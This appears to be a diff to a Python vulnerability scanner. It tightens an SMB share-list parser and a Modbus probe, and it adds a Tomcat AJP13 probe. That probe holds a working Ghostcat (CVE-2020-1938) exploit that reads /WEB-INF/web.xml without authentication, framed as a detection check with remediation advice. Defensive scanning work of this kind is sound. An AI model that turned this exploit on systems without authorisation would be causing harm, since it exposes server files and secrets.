-      def read_ndr_string(data, off):
-        """Read an NDR conformant+varying Unicode string."""
-        if off + 12 > len(data):
-          return "", off
-        max_count = struct.unpack_from("<I", data, off)[0]
-        off += 4
-        str_offset = struct.unpack_from("<I", data, off)[0]
-        off += 4
-        actual_count = struct.unpack_from("<I", data, off)[0]
-        off += 4
-        byte_len = actual_count * 2  # UTF-16LE
-        if off + byte_len > len(data):
-          s = data[off:].decode("utf-16-le", errors="ignore").rstrip("\x00")
-          return s, len(data)
-        s = data[off:off + byte_len].decode("utf-16-le", errors="ignore").rstrip("\x00")
-        off += byte_len
-        # Align to 4-byte boundary
-        if off % 4:
-          off += 4 - (off % 4)
-        return s, off
+      def read_ndr_string(off):
+        """An NDR conformant+varying Unicode string, ``(text, next offset)``; ValueError when malformed."""
+        max_chars, str_offset, actual = struct.unpack_from("<3I", stub, off)
+        off += 12
+        if str_offset != 0 or not 1 <= actual <= max_chars or off + actual * 2 > len(stub):
+          raise ValueError("bad NDR string header")
+        raw = stub[off:off + actual * 2]
+        if raw[-2:] != b"\x00\x00":
+          raise ValueError("NDR string not terminated")
+        off += actual * 2
+        return raw[:-2].decode("utf-16-le"), off + (-off % 4)  # strings start on a 4-byte boundary
 
-      for name_ptr, share_type, comment_ptr in entry_records:
-        name, offset = read_ndr_string(stub, offset)
-        comment, offset = read_ndr_string(stub, offset)
-        if name:
-          shares.append({
-            "name": name,
-            "type": share_type,
-            "comment": comment,
-          })
+      shares = []
+      for share_type, has_comment in records:  # deferred strings: name then comment, per entry
+        name, offset = read_ndr_string(offset)
+        comment = ""
+        if has_comment:
+          comment, offset = read_ndr_string(offset)
+        name = _ServiceInfraMixin._smb_clean_text(name)
+        if not name:
+          return []
+        shares.append({"name": name, "type": share_type, "comment": _ServiceInfraMixin._smb_clean_text(comment)})
 
+      # TotalEntries (never below the entries read), the resume handle (null, or referent + value), then WERROR
+      if struct.unpack_from("<I", stub, offset)[0] < entries:
+        return []
+      offset += 4
+      offset += 8 if struct.unpack_from("<I", stub, offset)[0] else 4
+      if struct.unpack_from("<I", stub, offset)[0] != 0:
+        return []
+      return shares
     except Exception:
-      pass
-    return shares
+      return []
 
   def _smb_try_null_session(self, target, port):
     """Attempt SMBv1 null session to extract Samba version from SessionSetup response.
@@ -1893,10 +1883,16 @@ class _ServiceInfraMixin(_ServiceProbeBase):
 
     return probe_result(raw_data=raw, findings=findings)
 
+  @staticmethod
+  def _is_modbus_reply(data, function_code):
+    """True for a valid Modbus/TCP reply (or exception reply) to ``function_code``."""
+    return (len(data) >= 8 and data[2:4] == b'\x00\x00'
+            and data[7] in (function_code, function_code | 0x80))
+
   @register_probe(
     display_name="Modbus service detection",
     description=(
-      "Modbus/TCP read-only function-code 17 (Report Server ID) "
+      "Modbus/TCP read-only function 0x2B / MEI 0x0E (Read Device Identification) "
       "probe. Detects ICS/SCADA exposure on the public internet."
     ),
     category=CATEGORY_SERVICE_INFO,
@@ -1926,12 +1922,22 @@ class _ServiceInfraMixin(_ServiceProbeBase):
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.settimeout(self._target_timeout(3))
       sock.connect((target, port))
-      request = b'\x00\x01\x00\x00\x00\x06\x01\x2b\x0e\x01\x00'
+      request = b'\x00\x01\x00\x00\x00\x05\x01\x2b\x0e\x01\x00'  # MBAP length 5: unit + 4 PDU bytes
       sock.sendall(request)
       data = sock.recv(256)
       if data:
         readable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
         raw["banner"] = readable.strip()[:120]
+      if data and not self._is_modbus_reply(data, 0x2b):
+        findings.append(Finding(
+          severity=Severity.INFO,
+          title="Port answered, not Modbus-confirmed",
+          description=f"{target}:{port} replied to a Modbus request, but the reply is not a valid Modbus/TCP frame.",
+          evidence="Reply failed Modbus validation (length, protocol id or function code).",
+          remediation="Verify the service on this port manually.",
+          confidence="tentative",
+        ))
+      elif data:
         findings.append(Finding(
           severity=Severity.CRITICAL,
           title="Modbus device responded to identification request",
@@ -2158,3 +2164,114 @@ class _ServiceInfraMixin(_ServiceProbeBase):
     except Exception:
       pass
     return findings
+
+  # ── Tomcat AJP13 ────────────────────────────────────────────────
+
+  _AJP_FILE = "/WEB-INF/web.xml"
+  _AJP_MARKER = b"<web-app"
+  _AJP_MAX_READ = 65536
+  _AJP_MAX_PACKETS = 64
+  _AJP_DEADLINE = 10  # seconds for the whole answer
+  # Not "/" and not ending in ".jsp": a welcome file or the JSP servlet could compile web.xml.
+  _AJP_REQ_URI = "/redmesh-ajp"
+
+  @staticmethod
+  def _ajp_string(text):
+    raw = text.encode()
+    return struct.pack(">H", len(raw)) + raw + b"\x00"
+
+  def _ajp_forward_request(self, target, port, file_path):
+    """AJP13 GET whose include attributes make Tomcat serve `file_path` (CVE-2020-1938)."""
+    s = self._ajp_string
+    body = b"\x02\x02" + s("HTTP/1.1") + s(self._AJP_REQ_URI) + s("127.0.0.1") + b"\xff\xff" + s(target)
+    body += struct.pack(">H", port) + b"\x00" + struct.pack(">H", 0)  # not SSL, no headers
+    for name, value in (
+      ("javax.servlet.include.request_uri", "/"),
+      ("javax.servlet.include.path_info", file_path),
+      ("javax.servlet.include.servlet_path", "/"),
+    ):
+      body += b"\x0a" + s(name) + s(value)
+    body += b"\xff"
+    return b"\x12\x34" + struct.pack(">H", len(body)) + body
+
+  def _ajp_read_file(self, sock):
+    """Collect body chunks until END_RESPONSE, the size or packet cap, the deadline or an error.
+
+    Returns the content read so far, also when the read ends early.
+    """
+    data, buf = b"", b""
+    deadline = self._deadline_in(self._AJP_DEADLINE)
+    try:
+      for _ in range(self._AJP_MAX_PACKETS):
+        while len(buf) < 4 or len(buf) < 4 + struct.unpack(">H", buf[2:4])[0]:
+          chunk = self._recv_by(sock, 4096, deadline)
+          if not chunk:
+            return data
+          buf += chunk
+        if buf[:2] != b"AB":
+          return data
+        length = struct.unpack(">H", buf[2:4])[0]
+        packet, buf = buf[4:4 + length], buf[4 + length:]
+        kind = packet[:1]
+        if kind == b"\x03" and len(packet) >= 3:  # SEND_BODY_CHUNK
+          data += packet[3:3 + struct.unpack(">H", packet[1:3])[0]]
+          if len(data) >= self._AJP_MAX_READ:
+            return data
+        elif kind != b"\x04":  # not SEND_HEADERS: END_RESPONSE or anything unexpected ends the read
+          return data
+    except (socket.timeout, OSError):
+      pass
+    return data
+
+  @register_probe(
+    display_name="Tomcat AJP13 file read (Ghostcat)",
+    description=(
+      "Over raw AJP13, read /WEB-INF/web.xml from the web application and "
+      "confirm CVE-2020-1938 when the content matches. Keeps the match marker only."
+    ),
+    category=CATEGORY_SERVICE_INFO,
+    default_cwe=(20,),
+    default_owasp=("A06:2021",),
+    cvss_template="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  )
+  def _service_info_ajp(self, target, port):  # default port: 8009
+    """
+    Ghostcat check. Sends one AJP13 forward request for a fixed file; no credential is used,
+    so the feature holding this probe gates it, not `active_auth`.
+    """
+    raw = {"ajp_file": self._AJP_FILE}
+    sock = None
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(self._target_timeout(3))
+      sock.connect((target, port))
+      sock.sendall(self._ajp_forward_request(target, port, self._AJP_FILE))
+      content = self._ajp_read_file(sock)
+    except Exception as exc:
+      raw["ajp_error"] = str(exc)[:120]
+      return probe_result(raw_data=raw, findings=[])
+    finally:
+      if sock:
+        sock.close()
+
+    findings = []
+    if self._AJP_MARKER in content:
+      marker = self._AJP_MARKER.decode()
+      raw["ajp_marker"] = marker
+      findings.append(Finding(
+        severity=Severity.CRITICAL,
+        cvss_vector=V.UNAUTHENTICATED_FULL_CONTROL,
+        title="Tomcat AJP file read confirmed (Ghostcat, CVE-2020-1938)",
+        cve=("CVE-2020-1938",),
+        **probe_cve_fields("CVE-2020-1938"),
+        description=f"The AJP13 connector on {target}:{port} served {self._AJP_FILE} from the web application "
+                    "to an unauthenticated request. The same flaw allows reading any file under the web root.",
+        evidence=f"AJP13 request for {self._AJP_FILE} returned content containing the marker '{marker}'",
+        remediation="Upgrade Tomcat to 9.0.31, 8.5.51, 7.0.100 or later; set a 'secret' on the AJP connector "
+                    "or disable it; do not expose port 8009.",
+        owasp_id="A06:2021",
+        cwe_id="CWE-20",
+        confidence="certain",
+        confidence_reason="behaviour_confirmed",
+      ))
+    return probe_result(raw_data=raw, findings=findings)
